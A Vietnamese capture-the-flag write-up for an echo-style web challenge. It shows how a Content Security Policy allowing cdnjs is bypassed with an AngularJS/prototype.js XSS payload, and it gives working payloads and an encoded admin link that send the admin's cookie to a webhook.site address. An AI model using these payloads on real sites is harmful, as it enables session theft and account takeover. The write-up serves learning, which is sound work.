
---
Tài liệu/Bài báo tham khảo:
https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/

---
![[Pasted image 20261012221259.png]]

Challenge khá thú vị khi cho chúng ta một chức năng để Echo tất cả những gì ta nhập ra Client-side.

Không biết do mình gà hay CLB troll nhưng mà mình thấy bài này không easy với mình cho lắm 😭

![[Pasted image 20261012221429.png]]

Có thể thấy, website đang sử dụng CSP:

```CSP
default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: *;
```

![[Pasted image 20261012222613.png]]

Ngoài chính trang web thì `<script>` còn cho phép nguồn từ cdnjs. Như trang web bên trên phân tích thì CSP thường bị Bypass từ source này.

![[Pasted image 20261012224810.png]]

Mình lên mạng tìm một lúc thì thấy một bài báo nói về điều này, copy payload của họ vào thì gặp XSS thật kaka.
Payload:
```html
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
    <div ng-app ng-csp>
      {{$on.curry.call().alert('xss')}}
    </div>
```
Bạn có thể đọc thêm tại: https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/ để hiểu cách nó hoạt động nhé.

![[Pasted image 20261012225006.png]]

Giờ mình chỉ việc sửa payload một chút để ăn cắp cookie của Admin là xong:

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script><div ng-app ng-csp>{{$on.curry.call().document.defaultView.location='https://webhook.site/5ff8415e-1c7c-46eb-9d75-c69ef358de6b/COOKIE='+document.cookie}}</div>
```

Nếu nó không được... Sau một lúc lâu test và có sự trợ giúp của AI thì mình tìm được cách để exfilltrate thông tin thông qua defaultView.location (mình không hiểu sao các hàm thông dụng như fetch() hay dùng document.location=... lại ko được, có lẽ server validate kiểu gì đó chăng 😥)

Nhưng đời lại không như mơ... Hình như bị sandbox nên mình không đọc được cookie, localStorage hay thậm chí cả DOM. Đến lúc này mình tự hỏi không biết có đang đi sai hướng không 😭 Bài Easy chắc không đến mức độ này chứ.

![[Pasted image 20261013111244.png]]


Sau đó mình tìm mãi mới nhận ra lý do không đọc được cookie và tìm được cách để thoát ra khỏi Sandbox của Angular sau đó thành công lấy được cookie của Admin 😭
Payload:
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
  {{$on.curry.call().top.location='https://webhook.site/5ff8415e-1c7c-46eb-9d75-c69ef358de6b/?c='+$on.curry.call().top.document.cookie}}
</div>
```
Send to admin:
```
http://web/index.php?msg=%3Cscript%20src%3D%22https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Fprototype%2F1.7.2%2Fprototype.js%22%3E%3C%2Fscript%3E%3Cscript%20src%3D%22https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Fangular.js%2F1.0.1%2Fangular.js%22%3E%3C%2Fscript%3E%3Cdiv%20ng-app%20ng-csp%3E%7B%7B%24on.curry.call().top.location%3D'https%3A%2F%2Fwebhook.site%2F5ff8415e-1c7c-46eb-9d75-c69ef358de6b%2F%3Fc%3D'%2B%24on.curry.call().top.document.cookie%7D%7D%3C%2Fdiv%3E
```


![[Pasted image 20261013112459.png]]